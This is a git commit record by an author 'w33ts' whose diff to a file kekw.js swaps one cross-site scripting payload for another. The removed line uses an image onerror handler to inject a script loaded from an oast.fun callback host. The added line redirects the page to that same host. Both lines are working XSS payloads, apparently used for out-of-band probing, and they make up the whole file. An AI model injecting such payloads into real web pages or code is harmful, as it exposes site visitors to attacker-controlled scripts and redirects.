ff6936e53b13b0c9932d20d2dccd17132f3f6259
w33ts <me@w33t.io>
2024-09-13 20:19:15 -0500

    lol versions go brrr

--- kekw.js
+++ kekw.js
@@ -1,1 +1,1 @@
-<img src="xasdasdasd" onerror="document.write('<script src="tbqimzzddwayopfmucrnud4kg540pi068.oast.fun"></script>')"/>
+<img src=x onerror="location.href='tbqimzzddwayopfmucrnud4kg540pi068.oast.fun'">
